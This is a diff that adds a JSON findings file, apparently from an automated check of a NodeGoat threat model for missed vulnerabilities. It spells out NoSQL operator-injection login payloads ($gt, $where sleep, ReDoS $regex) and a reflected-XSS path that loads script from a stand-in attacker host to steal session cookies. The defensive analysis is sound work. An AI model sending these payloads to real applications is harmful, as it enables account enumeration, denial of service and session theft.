@@ -1,0 +1,32 @@
+{
+  "candidate_gaps": [
+    {
+      "title": "NoSQL operator injection in the unauthenticated login query (user matching, ReDoS/$where DoS) via req.body object payloads",
+      "severity": "HIGH",
+      "evidence": "app/data/user-dao.js:91-93 (validateLogin runs usersCol.findOne({userName: userName}) with userName straight from req.body) and :103-107 (getUserByUserName same pattern); app/routes/session.js:53-58 destructures userName/password from req.body with no type check; server.js:71 enables bodyParser.json(), so a JSON body can supply objects/operators.",
+      "attack_path": "An attacker POSTs to /login (no auth guard) with Content-Type: application/json and body {\"userName\": {\"$gt\": \"\"}, \"password\": \"x\"}. bodyParser.json() passes the object through, and findOne({userName: {\"$gt\":\"\"}}) matches the first user (admin, _id:1), enabling account/username enumeration and oracle attacks. More damaging, {\"userName\": {\"$where\": \"sleep(5000)||true\"}} or {\"userName\": {\"$regex\": \"^(a+)+$\"}} is executed server-side by MongoDB, giving pre-auth server-side JS execution / ReDoS denial of service from an unauthenticated endpoint. The same operator-injection sink exists in getUserByUserName during signup.",
+      "why_missed": "The model scoped NoSQL injection to the $where string-concatenation in the allocations threshold (TM-006, an authenticated GET param) and treated the login path only as plaintext-password storage (TM-002) and missing rate limiting (TM-022). It never modeled that login/signup pass req.body values directly into a Mongo query selector with JSON body parsing enabled, so the classic operator-injection class (an unauthenticated query-selector sink at the most exposed endpoint) is absent. Note: full credential bypass is partly blunted because the password is compared with JS === rather than in the query, but user-matching, enumeration oracles, and $where/$regex server-side DoS remain exploitable."
+    },
+    {
+      "title": "Reflected XSS / HTML injection via the research SSRF response body written raw into a text/html response",
+      "severity": "HIGH",
+      "evidence": "app/routes/research.js:14-27 \u2014 url = req.query.url + req.query.symbol; needle.get(url, ...); res.writeHead(200, {\"Content-Type\":\"text/html\"}); res.write(body) with no escaping of the fetched body. app/views/research.html:17 shows url is a (user-controllable) form field.",
+      "attack_path": "An authenticated victim is lured to GET /research?url=http://attacker.tld/payload.html&symbol=x (e.g. via a link or auto-submitting page; there is no CSRF/SameSite protection). The server fetches attacker-controlled content and writes the raw HTML/JS body verbatim into a Content-Type: text/html response served from the application's own trusted origin. The injected script executes in the victim's authenticated session on the NodeGoat origin, allowing cookie theft (cookies are not httpOnly), CSRF-token-free state changes, and full account takeover.",
+      "why_missed": "TM-007 captured this code path strictly as SSRF (outbound request to internal addresses, reading proxied responses for recon/metadata theft) and even notes the body is written back \u2014 but framed the risk as information disclosure only. It did not recognize that res.write(body) into a text/html response on the trusted origin is a reflected-XSS / HTML-injection sink (client-side code execution, account takeover), a different STRIDE category and impact than SSRF. The model's XSS findings (TM-003/TM-004) only cover Swig template output and stored markdown memos, not this non-template raw response write, so this client-execution vector at the /research surface is uncovered."
+    }
+  ],
+  "confirmed_gaps": [
+    {
+      "title": "NoSQL operator injection in the unauthenticated login/signup query selector ($gt/$regex/$where) via JSON req.body object payloads",
+      "severity": "HIGH",
+      "evidence": "app/data/user-dao.js:91-93 and :103-107 pass req.body.userName straight into usersCol.findOne({userName: userName}); app/routes/session.js:53-58 destructures userName/password from req.body with no type check; server.js:71 app.use(bodyParser.json()); app/routes/index.js:34 registers POST /login with no auth guard.",
+      "why_missed": "Grounded and verified: with bodyParser.json() enabled and no type coercion, an unauthenticated POST /login body {\"userName\":{\"$gt\":\"\"}} reaches findOne as a query operator. The model's NoSQL coverage (TM-006) is scoped to the $where string-concatenation in the authenticated allocations threshold; the login path is only modeled as plaintext storage (TM-002), enumeration via error text (TM-023), and missing rate limiting (TM-022). No finding models req.body object values flowing into a Mongo query selector, so operator-based enumeration oracles and $where/$regex server-side-JS / ReDoS DoS from the most exposed unauthenticated endpoint are genuinely uncovered. Material: trivially reachable pre-auth (likelihood ~4-5) with server-side execution / DoS + account enumeration impact (~4), >=10 HIGH. (Full credential bypass is blunted because the password is compared with JS === outside the query, but the enumeration and DoS vectors stand.)"
+    }
+  ],
+  "rejected": [
+    {
+      "title": "Reflected XSS / HTML injection via the research SSRF response body written raw into a text/html response",
+      "reason": "already-covered \u2014 TM-007 addresses the same asset and exact code path (app/routes/research.js:14-27, surface E13): it identifies user-controlled url, the needle.get fetch, and the raw write-back of the fetched body, and its remediation explicitly states 'Do not echo arbitrary fetched bodies to the client,' which is the precise fix for this client-execution vector. Although the candidate reframes the weakness as CWE-79 reflected XSS (client-side code execution) rather than CWE-918 SSRF, the validator's coverage rule treats the same asset+sink as covered even when severity/classification differs, and TM-007's stated remediation already neutralizes the echo. Per the high bar and default-to-reject-when-uncertain instruction, this is the same issue under a different label, not a genuine recall gap."
+    }
+  ]
+}
